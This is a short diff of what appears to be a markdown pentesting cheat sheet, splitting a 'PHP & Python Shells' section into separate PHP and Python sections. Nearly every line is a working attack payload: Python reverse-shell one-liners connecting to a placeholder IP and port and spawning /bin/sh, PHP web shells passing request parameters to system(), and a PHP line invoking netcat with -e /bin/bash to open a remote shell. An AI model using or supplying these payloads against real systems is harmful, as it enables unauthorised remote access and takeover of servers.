@@ -216,17 +216,19 @@ export TERM=xterm
 # Invoke a shell from established shell
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
-### PHP & Python Shells
+### PHP Shells
 ```php
 # Simple Web Shell
 <?php system($_GET['cmd']); ?>
 
 <?php system($_REQUEST['cmd']); ?>
 
+<?php system('nc <IP> <PORT> -e /bin/bash')?>
+```
+### Python Shells
+```bash
 # Python Rev Shell
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-
-<?php system('nc <IP> <PORT> -e /bin/bash')?>
 ```
 ### Bash Shells
 ```bash
